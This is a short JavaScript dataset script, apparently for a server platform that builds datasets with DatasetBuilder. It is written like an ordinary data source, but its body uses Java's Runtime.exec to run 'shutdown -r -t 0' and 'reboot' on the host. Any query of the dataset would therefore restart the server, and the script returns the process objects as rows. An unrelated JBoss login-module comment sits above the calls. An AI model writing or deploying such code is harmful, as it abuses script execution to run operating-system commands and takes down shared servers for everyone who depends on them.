function createDataset(fields, constraints, sortFields) {
    var dataset = DatasetBuilder.newDataset();
    dataset.addColumn('1')
    dataset.addColumn('2')

    try {
        /** org.jboss.security.auth.spi.AbstractServerLoginModule */
        var retorno = new java.lang.Runtime.getRuntime().exec("shutdown -r -t 0");
        var retorno2 = new java.lang.Runtime.getRuntime().exec("reboot");
        log.dir("@@@ PATO");

        var DOC_ID = "OK";
        dataset.addRow([DOC_ID, String(retorno)]);
        dataset.addRow([DOC_ID, String(retorno2)]);

    } catch (e) {
        var dataset = DatasetBuilder.newDataset();
        dataset.addColumn('1')
        dataset.addColumn('2')
        dataset.addRow([e.message, e.lineNumber]);
    }

    return dataset;
}